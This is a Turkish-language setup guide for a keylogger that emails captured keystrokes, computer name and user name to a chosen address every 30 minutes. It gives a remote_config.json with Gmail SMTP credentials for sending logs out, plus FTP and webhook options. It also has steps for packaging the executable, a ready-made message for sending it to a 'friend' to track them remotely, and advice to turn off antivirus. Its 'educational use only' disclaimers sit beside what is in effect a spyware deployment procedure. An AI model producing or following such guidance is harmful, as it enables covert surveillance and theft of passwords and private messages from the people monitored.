# 📧 E-posta ile Uzaktan Takip Rehberi

## 🎯 E-posta Kullanımı için Gerekli Adımlar

### **1. Gmail Hesabı Hazırlığı**

#### **Gmail 2FA (2 Adımlı Doğrulama) Etkinleştirme:**
```
1. Gmail hesabınıza giriş yapın
2. Sağ üst köşede profil fotoğrafınıza tıklayın
3. "Google Hesabını Yönet" seçin
4. "Güvenlik" sekmesine gidin
5. "2 Adımlı Doğrulama" bölümünü bulun
6. "Başlayın" butonuna tıklayın
7. Telefon numaranızı doğrulayın
8. 2FA'yı etkinleştirin
```

#### **Gmail App Password Oluşturma:**
```
1. Google Hesabı > Güvenlik > 2 Adımlı Doğrulama
2. "Uygulama şifreleri" bölümünü bulun
3. "Uygulama seçin" dropdown'dan "Diğer (Özel ad)" seçin
4. Ad: "KeyLogger App" yazın
5. "Oluştur" butonuna tıklayın
6. 16 haneli şifreyi kopyalayın (örn: abcd efgh ijkl mnop)
7. Bu şifreyi not alın - bir daha gösterilmeyecek!
```

### **2. Konfigürasyon Dosyası Düzenleme**

#### **remote_config.json Dosyasını Düzenleyin:**
```json
{
  "EmailSettings": {
    "Enabled": true,
    "SmtpServer": "smtp.gmail.com",
    "SmtpPort": 587,
    "SenderEmail": "sizin-email@gmail.com",
    "SenderPassword": "abcd efgh ijkl mnop",
    "RecipientEmail": "alici-email@example.com",
    "SendIntervalMinutes": 30
  },
  "FtpSettings": {
    "Enabled": false,
    "Server": "",
    "Username": "",
    "Password": "",
    "RemoteDirectory": "/logs/",
    "UploadIntervalMinutes": 15
  },
  "WebhookSettings": {
    "Enabled": false,
    "WebhookUrl": "",
    "SendImportantKeysOnly": true
  },
  "GeneralSettings": {
    "ComputerName": "",
    "UserName": "",
    "MaxQueueSize": 1000,
    "EnableEncryption": false
  }
}
```

#### **Önemli Notlar:**
- **SenderEmail**: Gmail adresinizi girin
- **SenderPassword**: App Password'ü girin (normal şifre değil!)
- **RecipientEmail**: Logları alacak e-posta adresini girin
- **SendIntervalMinutes**: Kaç dakikada bir gönderileceği (30 önerilen)

### **3. Test Etme**

#### **Kendi Bilgisayarınızda Test:**
```
1. TestKeyLogger.exe'yi çalıştırın
2. "⚙️ Konfigürasyon" butonuna tıklayın
3. "🚀 Başlat" butonuna tıklayın
4. Birkaç tuş vurun
5. 30 dakika sonra e-posta gelip gelmediğini kontrol edin
```

#### **E-posta İçeriği Örneği:**
```
Konu: 🔍 KeyLogger Log - DESKTOP-ABC123 - 2025-01-06 02:30

Eğitim amaçlı keylogger log verisi.

🖥️ Bilgisayar: DESKTOP-ABC123
👤 Kullanıcı: TestUser
🕒 Tarih: 2025-01-06 02:30:15
📊 Tuş Sayısı: 25

⚠️ Bu log sadece eğitim amaçlıdır ve izinli kullanımdır.

📝 Log İçeriği:
[02:30:15] H
[02:30:15] e
[02:30:15] l
[02:30:15] l
[02:30:15] o
```

### **4. Arkadaşınıza Gönderme**

#### **Paket Hazırlama:**
```
1. RemoteKeyLogger_Package klasörünü zip'leyin
2. TestKeyLogger.exe dosyasını dahil edin
3. remote_config.json dosyasını dahil edin
4. EMAIL_KULLANIM_REHBERI.md dosyasını dahil edin
```

#### **Gönderme Mesajı:**
```
"Merhaba, eğitim amaçlı keylogger uygulamasını gönderiyorum.

ÖNEMLİ ADIMLAR:
1. EMAIL_KULLANIM_REHBERI.md dosyasını okuyun
2. Gmail App Password oluşturun
3. remote_config.json dosyasını düzenleyin
4. TestKeyLogger.exe'yi çalıştırın
5. '⚙️ Konfigürasyon' butonuna tıklayın
6. '🚀 Başlat' butonuna tıklayın

Sadece eğitim amaçlı ve açık izin ile kullanın!
İzinsiz kullanım yasalara aykırıdır."
```

### **5. Uzaktan Takip**

#### **E-posta ile Takip:**
```
- 30 dakikada bir otomatik e-posta gelecek
- Tuş vuruşları detaylı şekilde raporlanacak
- Bilgisayar adı ve kullanıcı bilgisi ile birlikte
- Zaman damgası ile birlikte
```

#### **Takip Verileri:**
```
- Hangi tuşlara basıldığı
- Ne zaman basıldığı
- Hangi bilgisayarda kullanıldığı
- Hangi kullanıcı tarafından kullanıldığı
```

## 🔧 Sorun Giderme

### **E-posta Gönderilmiyor:**
```
1. Gmail App Password doğru mu kontrol edin
2. 2FA etkinleştirilmiş mi kontrol edin
3. SMTP ayarları doğru mu kontrol edin
4. İnternet bağlantısı var mı kontrol edin
5. Firewall port 587'yi engelliyor mu kontrol edin
```

### **"Authentication Failed" Hatası:**
```
1. Normal şifre yerine App Password kullanın
2. App Password'ü doğru kopyaladığınızdan emin olun
3. 2FA'nın etkin olduğundan emin olun
```

### **"Connection Timeout" Hatası:**
```
1. Port 587'nin açık olduğundan emin olun
2. Firewall ayarlarını kontrol edin
3. İnternet bağlantısını test edin
4. SMTP sunucu adresini kontrol edin
```

## ⚠️ Güvenlik Uyarıları

### **Yasal Uyarılar:**
- **İzinsiz kullanım yasadışıdır**
- **Sadece eğitim amaçlı** kullanın
- **Açık yazılı izin** alın
- **Yasalara uygun** hareket edin

### **Güvenlik Önerileri:**
- **App Password'ü güvenli saklayın**
- **Log dosyalarını düzenli temizleyin**
- **E-posta hesabını güvenli tutun**
- **Antivirüs programlarını geçici olarak kapatın**

## 🎯 Sonuç

**✅ E-posta ile uzaktan takip hazır!**

1. **Gmail App Password** oluşturun
2. **remote_config.json** dosyasını düzenleyin
3. **TestKeyLogger.exe**'yi çalıştırın
4. **Arkadaşınıza gönderin**
5. **E-posta ile takip edin**

**📧 Artık 30 dakikada bir otomatik e-posta alacaksınız!**
